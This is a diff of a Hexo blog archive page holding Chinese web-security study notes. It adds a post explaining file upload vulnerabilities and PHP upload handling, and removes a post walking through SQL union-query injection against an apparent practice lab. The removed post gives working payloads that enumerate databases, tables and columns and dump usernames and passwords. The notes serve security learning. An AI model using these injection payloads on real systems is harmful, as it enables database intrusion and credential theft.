@@ -144,6 +144,20 @@ alert("Please Update Your IE \n请升级您的IE浏览器");
       <div class="post-content animated fadeIn">
         <header>
             
+              <div class="icon depth"><a href="/2016/07/26/文件上传/"> </a></div>
+              <h2 class="depth title" ><a class="animated" href="/2016/07/26/文件上传/">文件上传</a></h2>
+            
+            <time class="time title depth" datetime="2016-07-26T08:58:05.000Z">2016-07-26</time>
+          </header>
+      </div>
+    </article>
+  </div>
+
+  <div class="archive titlelist">
+    <article class="post">
+      <div class="post-content animated fadeIn">
+        <header>
+            
               <div class="icon depth"><a href="/2016/07/22/xss实例/"> </a></div>
               <h2 class="depth title" ><a class="animated" href="/2016/07/22/xss实例/">xss实例</a></h2>
             
@@ -265,20 +279,76 @@ alert("Please Update Your IE \n请升级您的IE浏览器");
     </article>
   </div>
 
-  <div class="archive titlelist">
-    <article class="post">
-      <div class="post-content animated fadeIn">
-        <header>
-            
-              <div class="icon depth"><a href="/2016/07/06/sql注入联合查询/"> </a></div>
-              <h2 class="depth title" ><a class="animated" href="/2016/07/06/sql注入联合查询/">sql注入联合查询</a></h2>
-            
-            <time class="time title depth" datetime="2016-07-06T11:48:17.000Z">2016-07-06</time>
-          </header>
-      </div>
-    </article>
-  </div>
 
+
+
+  <div class="animated fadeIn" idplus="文件上传" style="display: none;">
+    <div idplusp="文件上传">
+      <article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img s1c="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon depth"></div>
+        <time class="depth" datetime="2016-07-26T08:58:05.000Z"><a href="#">2016-07-26</a></time>
+      
+      
+  
+    <h1 class="depth title">文件上传</h1>
+  
+
+    </header>
+    <div class="entry depth">
+      
+        <p><strong>文件上传攻击的原理</strong><br>由于服务器端没有对用户上传的文件进行正确的处理，导致攻击者可以向某个可通过 Web 访问的目录上传恶意文件，并且该文件可以被Web服务器解析执行。<br>攻击者要想成功实施文件上传攻击，必须要满足以下三个条件：<br>1.可以上传任意脚本文件，且上传的文件能够被Web服务器解析执行，具体来说就是存放上传文件的目录要有执行脚本的权限。<br>2.用户能够通过Web访问这个文件。如果文件上传后，不能通过Web访问，那么也不能成功实施攻击。<br>3.要知道文件上传到服务器后的存放路径和文件名称，因为许多Web应用都会修改上传文件的文件名称，那么这时就需要结合其他漏洞去获取到这些信息。如果不知道上传文件的存放路径和文件名称，即使你上传了也无法访问。</p>
+<p><strong>什么是文件上传漏洞</strong></p>
+<p>为了让用户将文件上传到服务器，就像是给危及服务器的恶意用户打开<br>网站后台权限     增删改查<br>服务器权限<br>网站权限</p>
+<p><a href="https://github.com/litten/hexo-theme-yilia" target="_blank" rel="external">https://github.com/litten/hexo-theme-yilia</a></p>
+<p>服务器配置不当</p>
+<p>当服务器配置不当时，在不需要上传页面的情况下便可导致任意文件上传<br>开源编辑器上传漏洞<br>fckeditor<br>ckeditor</p>
+<p><strong>php文件上传时php能够获取文件什么信息</strong></p>
+<p>通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。<br>第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：</p>
+<pre><code>* $_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称
+* $_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型
+* $_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计
+* $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称
+* $_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码
+</code></pre><p><strong>一般情况下php过滤那些信息</strong><br>白名单过滤和黑名单过滤<br>主要是类型<br>还有一个就是大小<br>目录路径检测<br>文件扩展名</p>
+<p>服务端：<br>打开php.ini文件，找到下面四项（其实看注释也明白了）：<br>file_uploads：是否允许通过HTTP传递文件，默认是On允许；<br>upload_max_filesize：允许传递文件的最大大小，以M为单位，这是服务端配置文件设定的选项；<br>max_file_uploads：一次请求所允许传递的做多文件个数；<br>post_max_size：通过POST传递数据的最大大小，因为文件传递也是post方式，也算post传递，需要特别注意的是，它必须要 大于upload_max_filesize选项，因为在一次post传递过程中不仅会上传文件，还会传递其他数值，比如上面的POST数组中的数据，必 须考虑到，比如upload_max_filesize设为150M，这个就可以设为200M;<br>客户端：</p>
+<p>文件上传最基本的方法是通过form表单进行POST传递文件，实际上通过PUT方法也可以上传文件，只不过这种方法不安全，需要配置一些安全 验证机制，这里只写最常用的方式。form表单的input标签可以设置成文件上传按钮type=”file”，直接解决了如何选择文件的问题，接下来需 要设置form的两个属性：enctype和method<br>enctype:设置成multipart/form-data<br>method:设置成post<br>关于enctype属性设置可参考W3School的解释</p>
+<p>第一条是默认的值，在我们使用HTTP协议传递一般的表单数据时，实际上默认对数据进行了分块编码，比如默认的urlencode方式（空格转为+，其他 非字母字符转为%加两个十六进制大写数）；当enctype设置为第二个时，不会进行字符编码，使用上传控件（input标签type设为file时即 是）上传文件， 必须 设定为这个值；第三个则是值对空格编码为+，但不对非字母字符进行编码。</p>
+<p><strong>有可能被检测对应http数据包的那些部分</strong><br>主要是content-type  还有content-length filename=</p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+      
+    </div>
+  </div>
 
 
 
@@ -1115,61 +1185,6 @@ print &quot;-------------&quot;
 
 
 
-  <div class="animated fadeIn" idplus="sql注入联合查询" style="display: none;">
-    <div idplusp="sql注入联合查询">
-      <article class="post">
-  
-    <div class="gallery">
-  <div class="photoset">
-    
-      <img s1c="">
-    
-  </div>
-  <div class="control">
-    <div class="prev"></div>
-    <div class="next"></div>
-  </div>
-</div>
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon depth"></div>
-        <time class="depth" datetime="2016-07-06T11:48:17.000Z"><a href="#">2016-07-06</a></time>
-      
-      
-  
-    <h1 class="depth title">sql注入联合查询</h1>
-  
-
-    </header>
-    <div class="entry depth">
-      
-        <p>联合查询注入<br>联合查询的前提是必须有显示位<br>union可合并两个或多个select语句的结果集，<br>前提是两个select必有相同列、且各列的数据类型也相同<br>注入步骤<br>找注入点且得到闭合字符<br>判断数据库类型<br>猜解列数，得到显示位<br>得到基本信息(如：数据库名、数据库版本、当前数据库名等)<br>得到数据库名<br>得到表名<br>得到列名<br>得到列值<br>1先判断是否存在sql注入，加上’</p>
-<p><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/1.png?raw=true"></p>
-<p>有错误<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/2.png?raw=true" alt="image"><br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/3.png?raw=true" alt="image"><br>判断他有多少个字段<br>  ‘ Order by 3<br>  <img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/4.png?raw=true" alt="image"><br>  有3个字段，4会出错<br>  <img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/5.png?raw=true" alt="image"><br>  <a href="http://172.21.50.66/Less-1/?id=100000" target="_blank" rel="external">http://172.21.50.66/Less-1/?id=100000</a>‘ union select 1,version(),3 –+<br>   <img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/6.png?raw=true" alt="image"><br>   利用information_schema<br><a href="http://172.21.50.66/Less-1/?id=100000" target="_blank" rel="external">http://172.21.50.66/Less-1/?id=100000</a>‘ union select 1,2,table_name from information_schema.tables –+<br><a href="http://172.21.50.66/Less-1/?id=100000" target="_blank" rel="external">http://172.21.50.66/Less-1/?id=100000</a>‘ union select 1,2,group_concat(distinct+table_schema) from information_schema.tables –+  获取数据库的名字<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/7.png?raw=true" alt="image"><br>知道数据库的名字然后就可以爆出数据库中的表<br><a href="http://172.21.50.66/Less-1/?id=100000" target="_blank" rel="external">http://172.21.50.66/Less-1/?id=100000</a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/8.png?raw=true" alt="image"><br><a href="http://172.21.50.66/Less-1/?id=100000" target="_blank" rel="external">http://172.21.50.66/Less-1/?id=100000</a>‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br>Users表中的字段列<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/9.png?raw=true" alt="image"><br><a href="http://172.21.50.66/Less-1/?id=100000" target="_blank" rel="external">http://172.21.50.66/Less-1/?id=100000</a>‘ union select 1,2,group_concat(username,0x20,password) from security.users–+可以爆出users表中的用户名和密码<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/3/10.png?raw=true" alt="image"></p>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-      
-    </div>
-  </div>
-
-
-
 
 
 
@@ -1251,7 +1266,7 @@ print &quot;-------------&quot;
 <nav id="pagination" class="titlelist">
   
   
-    <a href="/page/2/" class="alignright next titlelist">Вперед</a>
+    <a href="/page/2/" class="alignright next titlelist">Next</a>
   
   <div class="clearfix"></div>
 </nav>
